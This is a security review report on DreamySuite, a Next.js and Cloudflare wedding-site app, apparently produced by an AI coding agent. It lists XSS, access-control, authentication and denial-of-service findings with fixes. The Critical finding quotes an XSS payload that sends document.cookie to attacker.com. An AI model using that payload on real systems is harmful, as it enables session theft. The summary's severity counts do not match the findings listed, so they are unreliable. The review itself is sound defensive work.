## Security Review: DreamySuite
Date: 2026-04-19
Reviewer: Claude Code (claude-sonnet-4-6)
Stack: Next.js 16 / TypeScript / Cloudflare Workers / D1 (SQLite) / better-auth / Kysely / Zod v4

---

### OWASP Findings

---

#### CRITICAL

**[CRITICAL] XSS — Injection via Email HTML (unescaped user input in notification emails)**
- File: `src/app/api/public/[siteSlug]/route.ts` lines 338–358
- Finding: The `notes`, `guestName` (= `firstNameClean + ' ' + lastNameClean`), and `firstNameClean` fields are interpolated directly into the HTML email body sent via Resend to the site owner and the guest. No HTML escaping is applied. An attacker submitting an RSVP with `firstName = "<script>alert(1)</script>"` or `notes = "<img src=x onerror=fetch('https://attacker.com/'+document.cookie)>"` injects arbitrary HTML into the owner's email client, which some clients execute. This is a stored XSS delivered via email.
- Fix: Create a minimal `escEmail(s: string)` helper that encodes `&`, `<`, `>`, `"`, `'` and apply it to every user-supplied variable before interpolation into the `html` string: `${escEmail(notes)}`, `${escEmail(guestName)}`, `${escEmail(firstNameClean)}`, `${escEmail(eventLabel)}` (eventLabel comes from DB but is itself populated from user-editable settings, so escape it too).

---

#### HIGH

**[HIGH] Broken Authentication — Guest site password stored and compared in plaintext**
- Files: `src/lib/schemas/settings.ts` line 25, `src/app/[slug]/route.ts` lines 75–76 and 144, `src/app/api/public/[siteSlug]/route.ts` line 138 (strips from API)
- Finding: The `guestPassword` field is stored as a cleartext string in D1. Comparison is `pw === settings.guestPassword` (line 76 and 144 of `[slug]/route.ts`). Any D1 data breach, Cloudflare dashboard access, or D1 read-only compromise exposes all site passwords. This also conflates authentication with the password value: the cookie stores the plaintext password, so cookie theft is equivalent to knowing the password forever.
- Fix: Hash the password on write using `crypto.subtle.digest("SHA-256", ...)` with a per-site salt stored separately, or use PBKDF2. On validation, hash the submitted value before comparison. Store `guestPasswordHash` + `guestPasswordSalt` instead of `guestPassword`. Alternatively, use a constant-time HMAC comparison token.

**[HIGH] Broken Access Control — Telemetry endpoint accepts unauthenticated writes with no siteId ownership check**
- File: `src/app/api/telemetry/route.ts` lines 12–55
- Finding: The `POST /api/telemetry` endpoint accepts up to 50 events per request with no authentication. The `siteId` field is accepted from the caller and written directly to `editor_event` with no verification that the caller owns that site. Any anonymous actor on the internet can flood the `editor_event` table with arbitrary data for any `siteId`, poisoning analytics, filling the D1 database, or causing storage-limit failures.
- Fix: Add session authentication (call `auth.api.getSession`). If the event includes a `siteId`, verify ownership via the existing `requireSiteOwnership` helper before inserting. If the endpoint must stay unauthenticated for public page-view tracking, strip `siteId` from the accepted fields and derive it only from a signed token or server-side context.

**[HIGH] Broken Access Control — Public `/api/sites/[id]/rsvp` creates new guests without authentication or site publishing check**
- File: `src/app/api/sites/[id]/rsvp/route.ts` lines 8–74
- Finding: This endpoint (`POST /api/sites/{id}/rsvp`) inserts a new guest row for any site ID, including draft/unpublished sites. There is no check that `status = 'published'`. An attacker who knows or guesses a site UUID can enumerate UUIDs and insert arbitrary guest records into any site — including private draft sites not yet live. The check `SELECT id FROM site WHERE id = ?` (line 18) does not filter by `status`.
- Fix: Add `AND status = 'published'` to the site existence check: `SELECT id FROM site WHERE id = ? AND status = 'published'`. Alternatively, accept submissions only via the slug-based public endpoint which already performs this check.

**[HIGH] Information Disclosure — Internal DB error messages returned in HTTP 500 response body**
- File: `src/app/api/sites/[id]/settings/route.ts` lines 82–83
- Finding: `catch (e) { const msg = e instanceof Error ? e.message : String(e); return apiError("DB_ERROR", msg, 500); }` — The raw D1 exception message (which may include table names, column names, constraint names, or SQL fragments) is returned verbatim in the JSON response body under the `message` field. This leaks schema details to authenticated but non-privileged users and any MITM.
- Fix: Log `msg` to `console.error` only, and return a generic message: `return apiError("DB_ERROR", "An internal error occurred. Please try again.", 500)`.

**[HIGH] Security Misconfiguration — No security headers (CSP, X-Frame-Options, X-Content-Type-Options, HSTS)**
- File: `next.config.ts` (no `headers()` function present)
- Finding: The Next.js config contains no `headers()` export, meaning the application ships without:
  - `Content-Security-Policy` — any XSS reaching the browser executes without restriction
  - `X-Frame-Options: DENY` — pages are frameable (clickjacking)
  - `X-Content-Type-Options: nosniff` — browser MIME sniffing enabled
  - `Strict-Transport-Security` — no HSTS enforcement
  - `Referrer-Policy` — referrer leaked to third-party scripts/CDNs
- Fix: Add a `headers()` function to `next.config.ts` returning these headers on all routes. At minimum:
  ```ts
  headers: async () => [{
    source: "/(.*)",
    headers: [
      { key: "X-Frame-Options", value: "DENY" },
      { key: "X-Content-Type-Options", value: "nosniff" },
      { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
      { key: "Strict-Transport-Security", value: "max-age=63072000; includeSubDomains; preload" },
      { key: "Content-Security-Policy", value: "default-src 'self'; ..." },
    ],
  }]
  ```
  CSP will require auditing inline scripts (the `[slug]/route.ts` page renderer uses extensive inline `<script>` blocks — these will need nonces or hashes).

---

#### MEDIUM

**[MEDIUM] Broken Authentication — `requireEmailVerification: false` allows account takeover via unverified email**
- File: `src/app/lib/auth.server.ts` line 21
- Finding: `emailAndPassword: { enabled: true, requireEmailVerification: false }` means any user who registers with an email they don't own can begin using the system immediately. Site invites are granted by email address match (`site_invite.email = session.user.email`), so an attacker who registers with the invited person's email gains immediate collaborator access to their site.
- Fix: Set `requireEmailVerification: true` and configure a Resend-based email verification flow via better-auth's `sendVerificationEmail` callback.

**[MEDIUM] Broken Authentication — No rate limiting on login, signup, or auth endpoints**
- File: `src/app/api/auth/[...all]/route.ts`, `src/app/lib/auth.server.ts`
- Finding: The better-auth handler is exposed with no rate limiting. There is no brute-force protection on `POST /api/auth/sign-in/email`. An attacker can attempt unlimited password guesses against any known email address.
- Fix: Enable better-auth's built-in `rateLimit` plugin, or add Cloudflare rate-limiting rules in the dashboard for `/api/auth/*` paths. Better-auth v1.x supports: `plugins: [rateLimit({ window: 60, max: 10 })]`.

**[MEDIUM] Broken Authentication — Guest site password cookie missing `Secure` flag**
- File: `src/app/[slug]/route.ts` line 149
- Finding: `Set-Cookie: ds_pw_${slug}=${encodeURIComponent(pw)}; Path=/; HttpOnly; SameSite=Strict; Max-Age=86400` — the `Secure` flag is absent. Over HTTP connections (dev, misconfigured proxy, or if HSTS is not enforced at the Cloudflare edge level), the password value is transmitted unencrypted. The cookie value is the plaintext guest password, compounding the plaintext storage issue above.
- Fix: Append `; Secure` to the Set-Cookie value. Once password hashing is implemented (see HIGH finding above), store a session token in the cookie instead of the raw password.

**[MEDIUM] Injection — `notes`, `name`, `message`, `pageSlug`, `lang` fields stored without length limits**
- Files: `src/app/api/public/[siteSlug]/route.ts` (notes, firstName, lastName), `src/app/api/sites/[id]/guestbook/route.ts` (name, message), `src/app/api/sites/[id]/content/route.ts` (pageSlug, lang, content)
- Finding: No maximum length is validated on any of these free-text inputs before DB insert. While D1 has a 1 MB row limit, very large `message` or `notes` values can exhaust storage, slow queries, and inflate Cloudflare egress. The `content` field in `site_content` accepts arbitrary JSON blobs with no size cap.
- Fix: Add length guards before insert. Suggested limits: `firstName`/`lastName` ≤ 100 chars, `notes` ≤ 2000 chars, guestbook `name` ≤ 100 chars, `message` ≤ 2000 chars, `pageSlug`/`lang` ≤ 64 chars, `content` JSON ≤ 500 KB (check `contentStr.length`). Return 400 on violation.

**[MEDIUM] Broken Access Control — `POST /api/sites/[id]/translations` does not verify blockIds belong to the site**
- File: `src/app/api/sites/[id]/translations/route.ts` lines 55–65
- Finding: Any authenticated user with access to site A can POST translation rows for block IDs that belong to site B (or non-existent blocks). The insert uses `siteId` from the URL param but `blockId` from the request body without cross-checking `block.siteId = siteId`. This allows cross-site data corruption.
- Fix: Before bulk insert, validate that each `r.blockId` exists in `block` with matching `siteId`: `SELECT id FROM block WHERE id IN (?, ...) AND siteId = ?`. Reject any row whose `blockId` fails this check.

**[MEDIUM] Broken Access Control — Guestbook and RSVP (`/sites/[id]/rsvp`, `/sites/[id]/guestbook`) accept submissions to any siteId including draft sites**
- Files: `src/app/api/sites/[id]/guestbook/route.ts` line 35, `src/app/api/sites/[id]/rsvp/route.ts` line 18
- Finding: Both endpoints verify `SELECT id FROM site WHERE id = ?` without filtering `status = 'published'`. Submissions can be made to private/draft sites. The guestbook additionally accepts GET (reading all entries) for any site ID with no auth, leaking all guestbook entries for all sites including unpublished ones.
- Fix: Add `AND status = 'published'` to the site existence check in both POST handlers. For the guestbook GET, require either published status or authentication.

**[MEDIUM] Sensitive Data Exposure — `wrangler.jsonc` commits D1 database ID and KV namespace ID to version control**
- File: `wrangler.jsonc` lines 49 and 53
- Finding: `database_id: "db07b9de-1e33-4b16-af0b-df7e4e444a54"` and `kv_namespaces.id: "8fb116b82a3f4b5d8de3195ebe28df04"` are committed. While these IDs alone don't grant access (Cloudflare still requires API token auth), they reduce attacker effort during reconnaissance, confirm the infrastructure provider, and may be combined with leaked API tokens to target specific resources. The Cloudflare DB UUID is also discoverable via the D1 dashboard API.
- Fix: This is a lower-urgency item because wrangler.jsonc must contain binding config. However, if the repo is public, consider using `wrangler secret` for all secrets and add a comment in wrangler.jsonc noting these IDs are non-sensitive binding identifiers, not credentials. Ensure the `CLOUDFLARE_API_TOKEN` secret in CI (`.github/workflows/deploy.yml` line 24) has the minimum required permissions (Workers:Edit + D1:Edit only, not Account:Admin).

**[MEDIUM] Repudiation — Site-publish, invite-send, invite-delete, domain-purchase and site-delete actions are not logged**
- Files: multiple API routes
- Finding: No audit log is written when a site is published (`PUT /settings` with `isLive: true`), when an invite is created or deleted, when a domain is purchased, or when template restore wipes all pages. If ownership disputes arise or data is lost, there is no forensic trail.
- Fix: Insert rows into a new `audit_log` table on these state-changing actions. Minimum fields: `id`, `siteId`, `userId`, `action`, `payload`, `createdAt`. The telemetry table (`editor_event`) exists but is unauthenticated and unstructured — a separate authenticated audit table is appropriate.

**[MEDIUM] Denial of Service — No payload size limit on JSON body endpoints**
- Files: All `parseJsonBody` callers and direct `req.json()` callers across `src/app/api/`
- Finding: Cloudflare Workers impose a 100 MB request body limit. Endpoints that call `req.json()` or `parseJsonBody()` will buffer the entire body before parsing. A 100 MB POST to `/api/sites/[id]/translations` (which accepts an unbounded `rows` array) or `/api/sites/[id]/content` (which accepts an unbounded JSON blob) could cause Worker CPU timeout or memory exhaustion.
- Fix: Add a `Content-Length` check before parsing: `if (parseInt(req.headers.get("content-length") ?? "0") > 1_048_576) return apiError(...)`. Or use `req.text()` then check `.length` before `JSON.parse`. The translations `rows` array should also cap at a maximum batch size (e.g. 200 rows).

**[MEDIUM] Security Misconfiguration — No `middleware.ts` / Edge middleware for authentication gates**
- Finding: There is no `src/middleware.ts`. All auth checks happen inside individual route handlers. If a route handler is accidentally added without an auth check (as happened with the current `/api/sites/[id]/rsvp` endpoint), there is no fallback layer to catch unauthenticated access. A global middleware that enforces session presence on all `/api/sites/*` routes (except explicit allowlist) would add defense-in-depth.
- Fix: Create `src/middleware.ts` that intercepts requests matching `/api/sites/:id/*`, calls `auth.api.getSession`, and returns 401 if no session exists — before the route handler runs. Exclude the guestbook and public RSVP endpoints from this middleware.

---

#### LOW

**[LOW] Sensitive Data Exposure — Health endpoint leaks app version**
- File: `src/app/api/health/route.ts` line 6
- Finding: `version: process.env.npm_package_version ?? "0.1.0"` is returned in the public GET `/api/health` response. Package version assists attackers in targeting known CVEs for that version.
- Fix: Remove the `version` field from the public health response, or gate it behind authentication.

**[LOW] Injection — Photo upload uses raw `file.name` in R2 key without sanitization**
- File: `src/app/api/sites/[id]/photos/route.ts` line 64
- Finding: `const r2Key = \`sites/${siteId}/${id}/${file.name}\`` — `file.name` comes from the multipart form's `filename` parameter, which the client controls. A filename like `../../evil` or one containing special characters could produce unexpected R2 key paths. R2 keys are not filesystem paths so directory traversal to sensitive files is not possible, but malformed keys can complicate lifecycle rules and logging, and an attacker could craft keys that look like other resources.
- Fix: Sanitize `file.name` before embedding: strip path separators, limit characters to `[a-zA-Z0-9._-]`, and enforce a max length of 128 chars. Use `path.basename(file.name).replace(/[^a-zA-Z0-9._-]/g, '_').slice(0, 128)`.

**[LOW] Sensitive Data Exposure — Canva callback logs full third-party error response body**
- File: `src/app/api/canva/callback/route.ts` line 40
- Finding: `console.error("[canva callback] token exchange failed", await tokenRes.text())` — If Canva's token endpoint returns an error body that includes partial token data or client credentials details in the error message, this is logged to Cloudflare Workers logs (which are observable in the dashboard).
- Fix: Log only the HTTP status code: `console.error("[canva callback] token exchange failed", tokenRes.status)`.

**[LOW] Repudiation — Invite emails record `invitedBy` as display name (mutable), not userId**
- File: `src/app/api/sites/[id]/invites/route.ts` line 98
- Finding: `invitedBy: check.userName` stores the human-readable display name, which can change. If a user's name changes after sending an invite, the invite record shows the old name with no link to the actual user account.
- Fix: Store `invitedBy` as `check.userId` (already available) and display the name by joining to `user` on read.

**[LOW] Broken Authentication — better-auth `baseURL` is hardcoded to `env.APP_URL` from vars**
- File: `src/app/lib/auth.server.ts` line 23, `wrangler.jsonc` line 43
- Finding: `APP_URL = "https://dreamysuite.com"` is in the `vars` block (plaintext in wrangler.jsonc). This is not a secret, but if a custom domain is ever pointed at this worker, the `baseURL` mismatch can cause session cookie domain errors. Minor operational risk.
- Fix: No action required for now. Document that `APP_URL` must be updated in wrangler when the primary domain changes.

---

### Dependency Findings

**[LOW] Dependency — `better-auth@^1.6.4`**
- No published CVEs against the 1.x line as of the knowledge cutoff. The `^` range will auto-install patch releases. Monitor the better-auth changelog for session fixation or token leakage advisories — it is a relatively new library with active development.

**[LOW] Dependency — `next@16.2.3`**
- Next.js 16.x is a newer release line. No CVEs known as of April 2026. The pinned version `16.2.3` (exact) is appropriate. The devDependency `eslint-config-next: 15.4.6` version mismatch (Next 16 + eslint-config-next 15) is a lint config issue, not a security issue, but could mask security-relevant lint rules.
- Fix: Align `eslint-config-next` to version `16.x` when available.

**[INFO] Dependency — `npm audit --audit-level=high` runs in CI**
- File: `.github/workflows/deploy.yml` line 20
- This is good practice and will gate deploys on known high/critical CVEs.

---

### STRIDE Findings

**Spoofing — Email-based invite access without email verification**
- Threat: An attacker registers an account with the email address of a legitimately invited collaborator. Because `requireEmailVerification: false`, they gain instant access to edit any site the victim was invited to.
- Mitigation: Enable email verification (see MEDIUM finding above). Until then, this is a viable account spoofing vector.

**Spoofing — RSVP name matching relies on guest list population**
- Threat: The public RSVP endpoint at `/api/public/[siteSlug]/rsvp` matches submitted names against `guest WHERE LOWER(firstName) = LOWER(?) AND LOWER(COALESCE(lastName,'')) = LOWER(?)`. If two guests share the same name, the first matching record is updated, regardless of which actual guest submitted the form. Whichever guest submits first "steals" the RSVP for the other.
- Mitigation: Acceptable in a wedding app context (name collision is rare), but document the limitation. A more robust design would issue per-guest unique tokens in the invite.

**Tampering — Translation rows can reference blocks not belonging to the target site**
- Threat: An authenticated user with access to site A can write translation values for block IDs in site B, tampering with site B's translations.
- Mitigation: Covered in the MEDIUM access control finding above. Validate block ownership before insert.

**Tampering — Template restore (`POST /api/sites/[id]/templates/[templateId]`) is destructive without confirmation token**
- Threat: A race condition or CSRF-like scenario (social engineering an authenticated user to trigger the POST) permanently deletes all pages and blocks for a site. There is no "are you sure" idempotency key or soft-delete / recovery mechanism.
- Mitigation: Add a required `confirm: true` field in the request body, or implement soft-delete for pages before the wipe.

**Repudiation — No immutable audit log for site publish, invite, or domain purchase events**
- Threat: If a site is improperly published, a domain purchased fraudulently, or an invite misused, there is no audit trail. The actor can deny the action.
- Mitigation: Covered in MEDIUM repudiation finding above.

**Information Disclosure — Error bodies leak DB schema details on settings PUT**
- Threat: The raw D1 error message (e.g., "no such column: xyz", "UNIQUE constraint failed: site_setting.siteId") is returned in the 500 response body, allowing an authenticated attacker to probe schema internals.
- Mitigation: Covered in HIGH finding above.

**Information Disclosure — Guestbook entries are publicly readable for any siteId (including unpublished sites)**
- Threat: `GET /api/sites/[id]/guestbook` returns all guestbook entries without auth and without a `status = 'published'` check. Internal test sites, draft events, or private sites have their guestbook exposed if the site UUID is known.
- Mitigation: Require `status = 'published'` for unauthenticated reads, or require authentication for GET.

**Denial of Service — Unauthenticated telemetry endpoint is an open write vector**
- Threat: A bot can POST 50-event batches to `/api/telemetry` indefinitely, filling the `editor_event` D1 table. Cloudflare D1's free tier has a 500 MB storage limit; paid plans can be exhausted too. No rate limiting, no size cap on `props` blobs beyond the 50-event batch limit.
- Mitigation: Covered in HIGH finding above. Add authentication. Until then, add a Cloudflare rate-limiting rule for `POST /api/telemetry` (e.g., 30 requests/minute per IP).

**Denial of Service — Canva import polls Canva API for up to 10 seconds per request (20 × 500 ms)**
- Threat: `POST /api/sites/[id]/canva/import` blocks the Worker for up to 10 seconds polling Canva's export job. Cloudflare Workers have a 30-second CPU time limit. An authenticated attacker (or an invited collaborator) can trigger multiple concurrent imports, exhausting Worker concurrency.
- Mitigation: Move the Canva export poll into a Cloudflare Queue or Durable Object. Return a job ID immediately and let the client poll for completion.

**Elevation of Privilege — Invited collaborators can trigger translate, media-delete, block-create/update/delete, and template-restore — same as owner**
- Threat: `requireSiteOwnership` grants collaborators (via `site_invite`) the same level of access as the actual owner for the majority of mutating operations. Template restore (which wipes all pages) and block deletion are included. A malicious or compromised collaborator account can destroy site content.
- Mitigation: Acceptable design trade-off for a collaborative tool, but the template restore operation (`POST /api/sites/[id]/templates/[templateId]`) is especially destructive. Consider restricting it to owners only via `requireSiteOwner` instead of `requireSiteOwnership`.

---

### Summary

| Severity  | Count |
|-----------|-------|
| Critical  | 1     |
| High      | 4     |
| Medium    | 7     |
| Low       | 5     |

**Ship: BLOCKED**

**Reason:** 1 Critical (XSS via unsanitized user input in outbound email HTML — active exploitation possible on any RSVP submission, no user interaction beyond submitting an RSVP), plus 4 High findings including unauthenticated telemetry write flooding, a public RSVP endpoint that accepts submissions to draft sites without auth, internal DB error messages in HTTP responses, and a complete absence of security headers.

The Critical and all four High findings are fixable in under a day of work. The two most impactful are:
1. Escape HTML in the RSVP notification email builder (1–2 lines of code, add `escEmail()` helper).
2. Add auth check + siteId ownership check to `/api/telemetry` (5–10 lines).
